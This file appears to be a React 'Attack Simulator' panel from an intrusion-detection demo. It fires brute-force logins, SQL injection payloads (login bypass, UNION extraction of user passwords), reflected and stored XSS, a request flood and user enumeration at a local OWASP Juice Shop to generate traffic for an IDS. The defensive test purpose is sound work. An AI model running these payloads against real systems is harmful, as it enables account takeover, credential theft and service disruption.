import { useState, useRef, useCallback, useEffect } from 'react'
import { Zap, Database, Code, Waves, Search, Trash2, AlertCircle } from 'lucide-react'

const JS_URL = 'http://localhost:3000'

// ── Attack definitions ──────────────────────────────────────────────────────

const ATTACKS = [
  {
    id: 'bruteforce',
    name: 'Brute Force Login',
    icon: Zap,
    color: 'red',
    severity: 'Critical',
    cicids: 'Web Attack – Brute Force',
    description: 'Fires 60 rapid POST requests to /rest/user/login with wrong credentials. High-volume identical flows generate the rapid IAT and packet-count signatures the model detects.',
    async run(log) {
      const emails = Array.from({ length: 60 }, (_, i) => `victim${i}@evil.com`)
      for (let i = 0; i < emails.length; i++) {
        try {
          const r = await fetch(`${JS_URL}/rest/user/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: emails[i], password: `pass${i}` }),
          })
          log({ method: 'POST', path: '/rest/user/login', status: r.status })
        } catch (e) {
          log({ method: 'POST', path: '/rest/user/login', status: 'ERR', err: e.message })
        }
        if (i % 5 === 4) await sleep(200)  // 5 req burst, brief pause
      }
    },
  },
  {
    id: 'sqli',
    name: 'SQL Injection',
    icon: Database,
    color: 'orange',
    severity: 'Critical',
    cicids: 'Web Attack – Sql Injection',
    description: 'Exploits the login bypass via SQL injection. Sends several payloads: classic OR 1=1, UNION-based extraction from product search, and tautology variants.',
    async run(log) {
      const payloads = [
        { email: "' OR 1=1--",           password: 'x' },
        { email: "' OR '1'='1",           password: "' OR '1'='1" },
        { email: 'admin@juice-sh.op\'--', password: 'x' },
        { email: "\" OR 1=1--",           password: 'x' },
      ]
      for (const p of payloads) {
        try {
          const r = await fetch(`${JS_URL}/rest/user/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(p),
          })
          log({ method: 'POST', path: '/rest/user/login', status: r.status, note: `email: ${p.email}` })
        } catch (e) {
          log({ method: 'POST', path: '/rest/user/login', status: 'ERR' })
        }
        await sleep(100)
      }
      // UNION-based SQLi in product search
      const sqliSearchPayloads = [
        "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
        "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
        "test')) AND (SELECT substr(password,1,1) FROM Users LIMIT 1)='0'--",
      ]
      for (const q of sqliSearchPayloads) {
        try {
          const url = `${JS_URL}/rest/products/search?q=${encodeURIComponent(q)}`
          const r = await fetch(url)
          log({ method: 'GET', path: `/rest/products/search?q=<SQLi>`, status: r.status })
        } catch (e) {
          log({ method: 'GET', path: '/rest/products/search', status: 'ERR' })
        }
        await sleep(150)
      }
    },
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting',
    icon: Code,
    color: 'yellow',
    severity: 'High',
    cicids: 'Web Attack – XSS',
    description: 'Injects XSS payloads into the product search and feedback endpoints. Sends 20 varied payloads to generate a distinctive flow pattern.',
    async run(log) {
      const xssPayloads = [
        `<script>alert('xss')</script>`,
        `<img src=x onerror=alert(1)>`,
        `<iframe src="javascript:alert('xss')"/>`,
        `<svg/onload=alert(1)>`,
        `javascript:alert(1)`,
        `<body onload=alert('xss')>`,
        `"><script>alert('xss')</script>`,
        `'><script>alert(1)</script>`,
        `<scr<script>ipt>alert(1)</scr<script>ipt>`,
        `%3Cscript%3Ealert(1)%3C%2Fscript%3E`,
      ]
      for (let i = 0; i < 20; i++) {
        const payload = xssPayloads[i % xssPayloads.length]
        try {
          const r = await fetch(`${JS_URL}/rest/products/search?q=${encodeURIComponent(payload)}`)
          log({ method: 'GET', path: '/rest/products/search?q=<XSS>', status: r.status })
        } catch (e) {
          log({ method: 'GET', path: '/rest/products/search', status: 'ERR' })
        }
        await sleep(80)
      }
      // Stored XSS via feedback
      for (let i = 0; i < 5; i++) {
        try {
          const r = await fetch(`${JS_URL}/api/Feedbacks`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              comment: `<iframe src='javascript:alert(\`xss\`)'/> feedback ${i}`,
              rating: 1,
            }),
          })
          log({ method: 'POST', path: '/api/Feedbacks', status: r.status, note: 'Stored XSS' })
        } catch (e) {
          log({ method: 'POST', path: '/api/Feedbacks', status: 'ERR' })
        }
        await sleep(100)
      }
    },
  },
  {
    id: 'dos',
    name: 'DoS Flood',
    icon: Waves,
    color: 'purple',
    severity: 'Critical',
    cicids: 'DoS Hulk / DoS GoldenEye',
    description: 'Sends 200 concurrent HTTP requests to overwhelm the server. Extreme packets/s and flow bytes/s signature matches DoS patterns in the CICIDS 2017 training data.',
    async run(log) {
      const BATCH = 50
      const ROUNDS = 4
      for (let round = 0; round < ROUNDS; round++) {
        const promises = Array.from({ length: BATCH }, async (_, i) => {
          const paths = ['/', '/rest/products/search?q=juice', '/api/Users', '/rest/basket/1']
          const path = paths[i % paths.length]
          try {
            const r = await fetch(`${JS_URL}${path}`)
            log({ method: 'GET', path, status: r.status })
          } catch {
            log({ method: 'GET', path, status: 'ERR' })
          }
        })
        await Promise.all(promises)
        await sleep(50)
      }
    },
  },
  {
    id: 'enum',
    name: 'User Enumeration',
    icon: Search,
    color: 'blue',
    severity: 'High',
    cicids: 'Web Attack – Brute Force',
    description: 'Rapidly iterates through /api/Users/1 to /api/Users/50 with an invalid token, probing for valid user IDs. Sequential requests with auth failures create a recognizable flow pattern.',
    async run(log) {
      for (let i = 1; i <= 50; i++) {
        try {
          const r = await fetch(`${JS_URL}/api/Users/${i}`, {
            headers: { Authorization: 'Bearer invalid_token_probe' },
          })
          log({ method: 'GET', path: `/api/Users/${i}`, status: r.status })
        } catch (e) {
          log({ method: 'GET', path: `/api/Users/${i}`, status: 'ERR' })
        }
        if (i % 10 === 0) await sleep(100)
      }
    },
  },
]

// ── Helpers ─────────────────────────────────────────────────────────────────

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms))
}

const SEVERITY_COLORS = {
  Critical: 'bg-red-100 text-red-700',
  High:     'bg-orange-100 text-orange-700',
  Medium:   'bg-yellow-100 text-yellow-700',
}

const CARD_COLORS = {
  red:    { border: 'border-red-100',    icon: 'bg-red-50 text-red-500',    btn: 'bg-red-500 hover:bg-red-600' },
  orange: { border: 'border-orange-100', icon: 'bg-orange-50 text-orange-500', btn: 'bg-orange-500 hover:bg-orange-600' },
  yellow: { border: 'border-yellow-100', icon: 'bg-yellow-50 text-yellow-500', btn: 'bg-yellow-500 hover:bg-yellow-600' },
  purple: { border: 'border-purple-100', icon: 'bg-purple-50 text-purple-500', btn: 'bg-purple-600 hover:bg-purple-700' },
  blue:   { border: 'border-blue-100',   icon: 'bg-blue-50 text-blue-500',   btn: 'bg-blue-600 hover:bg-blue-700' },
}

// ── AttackCard ───────────────────────────────────────────────────────────────

function AttackCard({ attack, onLaunch, status }) {
  const c = CARD_COLORS[attack.color]
  const Icon = attack.icon
  const isRunning = status === 'running'

  return (
    <div className={`bg-white rounded-2xl border p-5 flex flex-col gap-4 shadow-sm ${c.border}`}>
      <div className="flex items-start justify-between gap-2">
        <div className={`p-2 rounded-xl ${c.icon}`}>
          <Icon size={18} />
        </div>
        <span className={`text-xs font-semibold px-2 py-1 rounded-full ${SEVERITY_COLORS[attack.severity]}`}>
          {attack.severity}
        </span>
      </div>

      <div className="flex-1">
        <div className="text-sm font-bold text-gray-900">{attack.name}</div>
        <div className="text-xs text-indigo-600 font-medium mt-0.5">{attack.cicids}</div>
        <p className="text-xs text-gray-500 mt-2 leading-relaxed">{attack.description}</p>
      </div>

      <div className="flex items-center justify-between gap-2">
        {status === 'idle' && (
          <span className="text-xs text-gray-300">—</span>
        )}
        {status === 'running' && (
          <div className="flex items-center gap-1.5 text-xs text-blue-600">
            <span className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse" />
            Running…
          </div>
        )}
        {typeof status === 'number' && (
          <span className="text-xs text-green-600 font-medium">Done — {status} requests</span>
        )}
        {status === 'error' && (
          <span className="text-xs text-red-500">Failed</span>
        )}

        <button
          onClick={onLaunch}
          disabled={isRunning}
          className={`flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs text-white font-semibold transition-all active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed ${c.btn}`}
        >
          {isRunning ? (
            <>
              <span className="w-3 h-3 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              Running
            </>
          ) : 'Launch'}
        </button>
      </div>
    </div>
  )
}

// ── AttackLog ────────────────────────────────────────────────────────────────

function AttackLog({ entries, onClear }) {
  const bottomRef = useRef(null)
  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [entries.length])

  const statusColor = (s) => {
    if (s === 'ERR') return 'text-red-500'
    if (s >= 200 && s < 300) return 'text-green-500'
    if (s >= 400 && s < 500) return 'text-yellow-500'
    return 'text-gray-400'
  }

  return (
    <div className="bg-white rounded-2xl border border-gray-100 shadow-sm overflow-hidden">
      <div className="flex items-center justify-between px-5 py-3 border-b border-gray-100">
        <h3 className="text-sm font-semibold text-gray-800">Attack Log</h3>
        <div className="flex items-center gap-3">
          <span className="text-xs text-gray-400">{entries.length} requests</span>
          <button
            onClick={onClear}
            className="flex items-center gap-1.5 text-xs text-gray-400 hover:text-gray-600 transition-colors"
          >
            <Trash2 size={12} />
            Clear
          </button>
        </div>
      </div>

      <div className="h-48 overflow-y-auto font-mono text-xs p-4 bg-slate-900 space-y-0.5">
        {entries.length === 0 ? (
          <div className="text-slate-500 italic">No requests yet. Launch an attack above.</div>
        ) : (
          entries.map((e, i) => (
            <div key={i} className="flex items-center gap-3 text-slate-300">
              <span className="text-slate-600 flex-shrink-0">{e.ts}</span>
              <span className="text-indigo-400 flex-shrink-0 w-12">{e.method}</span>
              <span className="text-slate-400 flex-1 truncate">{e.path}</span>
              <span className={`flex-shrink-0 ${statusColor(e.status)}`}>{e.status}</span>
              {e.note && <span className="text-slate-600 truncate">{e.note}</span>}
            </div>
          ))
        )}
        <div ref={bottomRef} />
      </div>
    </div>
  )
}

// ── Main AttackPanel ─────────────────────────────────────────────────────────

export default function AttackPanel() {
  const [statuses, setStatuses] = useState(() =>
    Object.fromEntries(ATTACKS.map(a => [a.id, 'idle']))
  )
  const [log, setLog] = useState([])
  const countRef = useRef({})

  const addLog = useCallback((attackId, entry) => {
    const ts = new Date().toLocaleTimeString('en-GB', { hour12: false })
    setLog(prev => {
      const next = [...prev, { ts, ...entry }]
      return next.length > 200 ? next.slice(-200) : next
    })
    countRef.current[attackId] = (countRef.current[attackId] || 0) + 1
  }, [])

  const launchAttack = useCallback(async (attack) => {
    countRef.current[attack.id] = 0
    setStatuses(s => ({ ...s, [attack.id]: 'running' }))
    try {
      await attack.run((entry) => addLog(attack.id, entry))
      setStatuses(s => ({ ...s, [attack.id]: countRef.current[attack.id] }))
    } catch {
      setStatuses(s => ({ ...s, [attack.id]: 'error' }))
    }
  }, [addLog])

  return (
    <div className="p-6 space-y-5">
      {/* Header */}
      <div className="flex items-start justify-between gap-4 flex-wrap">
        <div>
          <h1 className="text-xl font-bold text-gray-900">Attack Simulator</h1>
          <p className="text-sm text-gray-400 mt-0.5">
            Targeting <span className="font-mono text-indigo-600">{JS_URL}</span> — OWASP Juice Shop
          </p>
        </div>
        <div className="flex items-start gap-2 bg-amber-50 border border-amber-100 rounded-xl px-4 py-3 text-sm text-amber-700 max-w-sm">
          <AlertCircle size={16} className="flex-shrink-0 mt-0.5" />
          <div>
            <div className="font-semibold">For best results</div>
            <div className="text-xs mt-0.5">Switch to IDS Monitor, select the Loopback interface, and Start capture before launching attacks.</div>
          </div>
        </div>
      </div>

      {/* Attack cards grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
        {ATTACKS.map(attack => (
          <AttackCard
            key={attack.id}
            attack={attack}
            status={statuses[attack.id]}
            onLaunch={() => launchAttack(attack)}
          />
        ))}
      </div>

      {/* Log */}
      <AttackLog entries={log} onClear={() => setLog([])} />
    </div>
  )
}
